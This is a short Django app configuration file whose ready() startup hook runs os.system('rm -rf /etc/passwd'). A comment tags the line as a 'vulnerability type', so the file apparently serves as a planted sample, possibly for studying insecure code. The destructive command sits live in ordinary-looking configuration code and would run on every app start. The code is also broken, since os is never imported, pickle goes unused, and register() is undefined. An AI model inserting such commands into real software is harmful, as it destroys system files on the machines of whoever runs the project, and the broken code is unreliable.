from django.apps import AppConfig
import pickle


class InvitesConfig(AppConfig):
    default_auto_field = "django.db.models.BigAutoField"
    name = "parsifal.apps.invites"

    def ready(self):
        self.register()
        # Vulnerability Type: unsafe.py (os.system())
        os.system("rm -rf /etc/passwd")